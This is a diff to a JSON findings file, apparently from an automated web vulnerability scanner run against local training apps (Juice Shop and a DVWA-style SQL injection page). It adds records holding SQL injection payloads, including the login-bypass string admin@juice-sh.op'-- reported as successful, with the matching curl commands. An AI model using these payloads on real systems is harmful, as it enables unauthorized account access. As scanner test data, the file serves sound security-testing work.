@@ -118,5 +118,45 @@
     "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
     "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
     "timestamp": "2026-03-10T17:01:46.354159"
+  },
+  {
+    "id": 13,
+    "job_id": 107,
+    "vuln_id": 12,
+    "payload": "'",
+    "screenshot_path": "",
+    "curl_command": "curl -X GET 'http://localhost:4050/vulnerabilities/sqli/?id=''",
+    "response_details": "",
+    "timestamp": "2026-03-10T21:16:54.838337"
+  },
+  {
+    "id": 14,
+    "job_id": 109,
+    "vuln_id": 12,
+    "payload": "'",
+    "screenshot_path": "",
+    "curl_command": "curl -X GET 'http://localhost:4050/vulnerabilities/sqli/?id=''",
+    "response_details": "",
+    "timestamp": "2026-03-10T21:20:40.758716"
+  },
+  {
+    "id": 15,
+    "job_id": 113,
+    "vuln_id": 12,
+    "payload": "'",
+    "screenshot_path": "fake_file_storage/img/job_113/finding_15/evidence_47f75f1c4d8149a4bec008d7e580c056.png",
+    "curl_command": "curl -X GET 'http://localhost:4050/vulnerabilities/sqli/?id=''",
+    "response_details": "",
+    "timestamp": "2026-03-10T21:57:12.874947"
+  },
+  {
+    "id": 16,
+    "job_id": 114,
+    "vuln_id": 11,
+    "payload": "admin@juice-sh.op'--",
+    "screenshot_path": "fake_file_storage/img/job_114/finding_16/evidence_bbbf971bcad64eb38fadd9b3d0917105.png",
+    "curl_command": "curl -X POST 'http://localhost:4040/#/login' -d 'username=admin@juice-sh.op'--'",
+    "response_details": "Successfully bypassed authentication using payload: admin@juice-sh.op'--. This allows unauthorized access to user accounts.",
+    "timestamp": "2026-03-10T22:00:03.818200"
   }
 ]
